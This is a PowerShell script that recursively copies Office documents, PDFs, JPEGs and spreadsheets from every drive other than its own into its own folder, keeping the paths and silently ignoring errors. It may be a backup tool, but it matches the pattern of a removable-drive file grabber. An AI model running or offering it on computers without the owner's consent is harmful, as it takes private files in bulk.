function Get-FilesExcludingDirs {
    param (
        [string]$Path,
        [string[]]$ExcludeDirs,
        [string[]]$FileTypes
    )

    # Get all child items in current directory
    $items = Get-ChildItem -Path $Path -Force -ErrorAction SilentlyContinue

    foreach ($item in $items) {
        if ($item.PSIsContainer) {
            # Check if directory name is in exclude list (case-insensitive)
            if ($ExcludeDirs -contains $item.Name.ToLower()) {
                # Skip this directory and its contents
                continue
            }
            else {
                # Recurse into subdirectory and output files
                Get-FilesExcludingDirs -Path $item.FullName -ExcludeDirs $ExcludeDirs -FileTypes $FileTypes
            }
        }
        else {
            # It's a file, check if it matches file types
            foreach ($pattern in $FileTypes) {
                if ($item.Name -like $pattern) {
                    # Output the file object
                    $item
                    break
                }
            }
        }
    }
}

# Define directories to exclude (case-insensitive), now including "windows"
$excludedDirs = @("windows", "program files", "program files (x86)", "system volume information")

# Updated file types: removed .png and .gif; added .xls and .xlsx
$fileTypes = @("*.doc","*.docx","*.pdf","*.jpg","*.jpeg","*.xls","*.xlsx")

$destination = $PSScriptRoot
$destDriveLetter = $destination.Substring(0,1).ToUpper()
$drives = Get-PSDrive -PSProvider FileSystem | Where-Object { $_.Free -ne $null -and $_.Name.ToUpper() -ne $destDriveLetter }
$createdDirs = New-Object System.Collections.Generic.HashSet[string]

foreach ($drive in $drives) {
    $source = "$($drive.Name):\"
    Write-Host "Processing $source ..."

    foreach ($file in Get-FilesExcludingDirs -Path $source -ExcludeDirs $excludedDirs -FileTypes $fileTypes) {
        $relativePath = $file.FullName.Substring(3)
        $targetPath = Join-Path $destination $relativePath
        $targetDir = Split-Path $targetPath -Parent

        if (-not $createdDirs.Contains($targetDir)) {
            if (-not (Test-Path $targetDir)) {
                New-Item -ItemType Directory -Path $targetDir -Force | Out-Null
            }
            $createdDirs.Add($targetDir) | Out-Null
        }

        Copy-Item -Path $file.FullName -Destination $targetPath -Force -ErrorAction SilentlyContinue

        # Display the copied file path
        Write-Host "Copied file: $targetPath"
    }
}
